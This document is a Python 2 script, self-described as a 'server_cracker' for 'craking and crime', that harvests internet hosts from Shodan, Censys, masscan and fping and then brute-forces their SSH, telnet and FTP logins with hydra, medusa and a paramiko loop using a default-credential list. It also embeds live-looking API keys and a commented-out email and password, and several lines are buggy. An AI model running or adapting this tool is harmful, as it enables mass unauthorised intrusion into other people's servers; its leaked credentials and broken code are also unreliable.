#!/usr/bin/python
# -*- coding:utf-8 -*-

import os
import sys 

try:
	import shodan
	import json
	import requests
	import censys.certificates
	#from zoomeye import zoomeye
	import sys
	import time 
	import paramiko
	import socket
	#import random
	#comment 1 try imports
except Exception as e:
	print("error: ", e)
	os.system("easy_install shodan")
	os.system("easy_install -U shodan")
	os.system("easy_install zoomeye-SDK")
	#os.system("git clone https://github.com/s0m30ne/zoomeye.git")
	#os.system("cd zoomeye/")
	os.system("pip install -U cryptography")
	os.system("pip install --upgrade setupext-pip")
	os.system("pip -v install pycurl --upgrade")
	os.system("pip install paramiko")

#ferramentas pra auxilio brute force
os.system("apt-get install hydra")
os.system("apt-get install medusa")	
os.system("apt-get install git")
os.system("apt-get install masscan")
os.system("git clone https://github.com/robertdavidgraham/masscan")
os.system("cd masscan/")
os.system("apt-get install gcc make libpcap-dev ")
os.system("make")
os.system("cd ..")

#cores
class s_colors():
	red = "\033[31m"
	gre = "\033[32m"
	blue = "\033[34m"
	ye = "\033[33m"


#bannn
class bann():
	pop_corn_b = """

█████████████▀▀▀▀▀███████▀▀▀▀▀█████████████ 
█████████▀░░▀▀█▄▄▄▄▄▄██▄▄▄▄▄▄█▀░░▀█████████ 
████████▄░░▄▄████▀▀▀▀▀▀▀▀▀████▄▄░░▄████████ 
████▀▀▀▀█████▀░░░░░░░░░░░░░░░▀█████▀▀▀▀████ 
██▀░░░░░░██▀░░░░░░██░░░██░░░░░░▀██░░░░░░▀██ 
█░░░▀▀▀▀███░░░░░░░██░░░██░░░░░░░███▀▀▀▀░░░█ 
█▄▄░░░░░░██░░░░▄░░▀▀░░░▀▀░░▄░░░░██░░░░░░▄▄█ 
████▄░░░░▀██░░░░███████████░░░░██▀░░░░▄████  
██████████▀██▄░░░▀███████▀░░░▄██▀██████████  root@POP_corn:/home/test# server_cracker :){}
███████▀░░░████▄▄░░░░░░░░░▄▄████░░░▀███████              @desmondelite
██████░░░▄▀░░▀▀▀███████████▀▀▀░░▀▄░░░██████ 
██████░░░▀░░░░░░░░▄▄▄█▄▄▄░░░░░░░░▀░░░██████ 
████████▄▄▄▄▄▄███████████████▄▄▄▄▄▄████████ 
██████████████████▀░░▀█████████████████████ 
█████████████████▀░░░▄█████████████████████ 
█████████████████░░░███████████████████████ 
██████████████████░░░▀█████████████████████ 
███████████████████▄░░░████████████████████ 
█████████████████████░░░███████████████████

""".format(s_colors.gre)
	saida = """

 ██▓███   ▒█████   ██▓███   ▄████▄   ▒█████   ██▀███   ███▄    █ 
▓██░  ██▒▒██▒  ██▒▓██░  ██▒▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒ ██ ▀█   █ 
▓██░ ██▓▒▒██░  ██▒▓██░ ██▓▒▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▓██  ▀█ ██▒
▒██▄█▓▒ ▒▒██   ██░▒██▄█▓▒ ▒▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▓██▒  ▐▌██▒
▒██▒ ░  ░░ ████▓▒░▒██▒ ░  ░▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒▒██░   ▓██░
▒▓▒░ ░  ░░ ▒░▒░▒░ ▒▓▒░ ░  ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ 
░▒ ░       ░ ▒ ▒░ ░▒ ░       ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░░ ░░   ░ ▒░
░░       ░ ░ ░ ▒  ░░       ░        ░ ░ ░ ▒    ░░   ░    ░   ░ ░ 
             ░ ░           ░ ░          ░ ░     ░              ░ 
                           ░                                     	

+===============================================================+
| [*] You do not know what results will come from your action.. |
|        but if you do nothing ... it will not work!            |
+---------------------------------------------------------------+
| [-] craking and crime!                                        |
+===============================================================+
| [+] credits: @desmondelite                                    |
+===============================================================+

"""
print(s_colors.red+bann.pop_corn_b+s_colors.red+bann.saida)

class api_C():
	#credenciais das apis 
	key_shodan = "wSLhIB3145UA1WxR3ehBtbW9KK2XWK05"
	id_censys = "0b0a437b-9b28-47de-89d5-2d168d0fc7cf"
	secret_censys = "IpFLUkaxpJNtitqAkmxwQedDfcHEHN5Z"
	url_censys = "https://www.censys.io/api/v1"
	#em_z = "kenykenw@gmail.com"
	#se_z = "wendel27071999"



def brute_ssh(vitima, usuario, porta, wordlist):
    try:
        file=open(wordlist, "r")
        for pwd in file:
            pwd=pwd[:-1]
            #vitima = str()
            #pwd = str()
            #porta = int()
            c = "SENHA: "+ str(pwd) + " PORT:" + str(porta)
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(vitima, porta, usuario, pwd)
                print(verde+"\n[HOST]:\t"+"\t"+vitima+"\t"+" \tSENHA ENCONTRADA : "+"\t"+c)
                print """ +========================================================+
                          | [+] SERVER SSH VULNERAVEL ENCONTRADO: %s               |
                          +--------------------------------------------------------+
                          """%pwd
                results_bs = open("results", "w")
                results_bs.write(vitima, pwd)


                break;
            except paramiko.AuthenticationException:
                print(vermelho+"\n[HOST]:\t"+ "\t"+vitima+"\t"+" \tTENTANDO BRUTE FORCE : "+"\t"+c)
                ssh.close()
            except socket.error:
            	print ""
                print(vermelho+"[-] ERRO  NA CONEXAO COM: (socket.error): %s"%vitima)
                break;

        ssh.close()
    except IOError:
        print("[-] ERRO WORDLIST NAO ENCONTRADA: %s"%wordlist)



isso = raw_input("[+] Type 'S' to continue: "+s_colors.blue)
time.sleep(2)

def censys_fun():
	time.sleep(2)

	page_c = 1
	pages = float("inf")

	while page_c >= pages:
		key_censys = raw_input("[+] type a keyserver censys: ")
		global escrever_pesquisa_censys
		escrever_pesquisa_censys = open("popcorn_censys.txt", "w")

		params = {'query' : key_censys, 'page' : page_c}

		res_c = requests.post(api_C.url_censys+"/search/ipv4", json=params, auth=(api_C.id_censys, api_C.secret_censys))

		pay = res_c.json()

		for i in pay["results"]:
			ip_c = i["ip"]
			proto_c = i["protocols"]
			print "[+] result censys [+]"
			print "[+] ip censys : %s"%ip_c
			print "[+] protocol cesys: %s"%proto_c
			print ""
			print "[+] writing ips censys in 'popcorn_censys.txt'......."
			#time.sleep(2)
			escrever_pesquisa_censys.write(str(ip_c)+ "\n")
			escrever_pesquisa_censys.close()

		pages = pay['metadata']['pages']
					
		page_c += 1
try:
	if isso.lower() == "s":
		print(s_colors.red+"[!] iniciating script scan......")
		try:
			api_shodan = shodan.Shodan(str(api_C.key_shodan)) 
			global escrever_pesquisa_s
			escrever_pesquisa_s = open("popcorn_shodan.txt", "w")
			key_search = str(raw_input("[+] type a key server: "+s_colors.blue))
			result_shodan = api_shodan.search(key_search)
			global count
			count = 1
			count += 1
			#escrever scan

			for re in result_shodan["matches"]:
				ips = re["ip_str"]
				port_s = re["port"]
				isp_s = re["isp"]
				timestamp_s = re["timestamp"]

				#for ips in result_shodan["matches"]:
				
				a1 = int(count) + 1
				[a1 for re in result_shodan["matches"]]	
				print '[+] Server [+] %d'%a1
				print '[+] ip server: %s'%ips
				print '[+] port server: %s'%port_s
				print '[+] isp server: %s'%isp_s
				print '[+] timestamp server: %s'%timestamp_s
				print ''

				
				print '[+] writing ips in "popcorn_shodan.txt".......'
				escrever_pesquisa_s.write(str(ips) + '\n')
				


			global per_c
			per_c = raw_input("[+] type a 's' to continue censys: ")

			if per_c.lower() == "s":
				escrever_pesquisa_s.close()
				print("[+] iniciating POP_c.py ")
				time.sleep(1)
				os.system("python3 POP_c.py")
				#erro ao chamar a funçao pois so pega no python3 criar script separado	
				#censys_fun()
			elif per_c.lower() == "masscan":
				print("[+]iniciating masscan......")
				set_range = raw_input("[+] set a range for scan masscan: "+s_colors.gre)
				os.system("masscan -p 22 {} > popcorn_masscan.txt".format(set_range))
				set_range1 = raw_input("[+]] set a range for scan fping: ")
				os.system("apt-get install fping")
				os.system("fping -g {} | grep alive > popcorn_fping.txt".format(set_range1))
				#termina scan por enquanto
			elif per_c.lower() == "bruteall":
				list_users = []
				list_users.append("root\n")	
				list_users.append("pi\n")
				list_users.append("uucp\n")
				list_users.append("admin\n")
				list_users.append("test\n")
				list_users.append("ftp\n")
				list_users.append("demo\n")
				list_users.append("user1\n")
				list_users.append("sync\n")
				list_users.append("ubnt\n")
				list_users.append("ubuntu\n")
				list_users.append("lisa\n")
				list_users.append("sshd\n")
				list_users.append("mysql\n")
				list_users.append("oracle\n")
				list_users.apppend("user\n")
				list_users.append("guest\n")
				list_users.append("info\n")
				list_users.append("nagios\n")
				list_users.append("postgres\n")
				list_users.append("www\n")
				list_users.append("backup\n")
				list_users.append("support\n")
				list_users.append("r00t\n")
				list_users.append("bin\n")
				#end list users
				list_pass = []
				list_pass.append("toor\n")
				list_pass.append("raspberry\n")
				list_pass.append("uucp\n")
				list_pass.append("admin\n")
				list_pass.append("test\n")
				list_pass.append("asteriskftp\n")
				list_pass.append("demo\n")
				list_pass.append("user1\n")
				list_pass.append("sync\n")
				list_pass.append("ubnt\n")
				list_pass.append("ubuntu\n")
				list_pass.append("lisa\n")
				list_pass.append("sshd\n")
				list_pass.append("mysql\n")
				list_pass.append("oracle\n")
				list_pass.apppend("user\n")
				list_pass.append("guest\n")
				list_pass.append("info\n")
				list_pass.append("nagios\n")
				list_pass.append("postgres\n")
				list_pass.append("www\n")
				list_pass.append("backup\n")
				list_pass.append("support\n")
				list_pass.append("r00t\n")
				list_pass.append("bin\n")
				list_pass.append("123456\n")
				list_pass.append("password123\n")
				#end pass list
				arq_user = open("users.txt", "w")
				arq_user.writelines(list_users)
				#arq_user.close()
				#end arq user
				arq_pass = open("pass.txt", "w")
				arq_pass.writelines(list_pass)
				#arq_pass.close()
				print("[+] writing user list and passlist......")
				time.sleep(2)
				cont_b = raw_input("[+] type 's' to continue: ")
				if cont_b.lower() == "s":
					arq_user.close()
					arq_pass.close()
					os.system("hydra -L users.txt -P pass.txt -M popcorn_shodan.txt ssh")
					os.system("hydra -L users.txt -P pass.txt -M popcorn_censys.txt ssh")
					os.system("hydra -L users.txt -P pass.txt -M popcorn_shodan.txt -s 2222 ssh")
					os.system("hydra -L users.txt -P pass.txt -M popcorn_shodan.txt telnet")
					os.system("hydra -L users.txt -P pass.txt -M popcorn_shodan.txt ftp")
					os.system("hydra -L users.txt -P pass.txt -M popcorn_cesys.txt -s 2222 ssh")
					os.system("hydra -L users.txt -P pass.txt -M popcorn_fping.txt ssh")
					os.system("hydra -L users.txt -P pass.txt -M popcorn_masscan.txt ssh")
					time.sleep(2)
					os.system("medusa -H popcorn_shodan.txt -U users.txt -P pass.txt -M ssh")
					os.system("medusa -H popcorn_censys.txt -U users.txt -P pass.txt -M ssh")
					os.system("medusa -H popcorn_fping.txt -U users.txt -P pass.txt -M ssh")
					os.system("medusa -H popcorn_masscan.txt -U users.txt -P pass.txt -M ssh")
					time.sleep(2)
					#funcao paramiko
					arq_ss = open("popcorn_shodan.txt", "r")
					arq_uu = open("users.txt", "r")
					arq_word = open("pass.txt", "r")
					port_ss = 22

					[users_ss for users_ss in arq_uu.readlines()]
					global users_ss
					if arq_ss and arq_word:
						for ip in arq_ss.readlines():
							brute_ssh(ip, users_ss, port_ss, arq_word)

					arq_ss.close()
					arq_uu.close()
					arq_word.close()
					#fim dessa bosta
		except Exception as eru:
			print "[-] An error has occurred.",eru

except KeyboardInterrupt:
	print "[-] saindo..........."			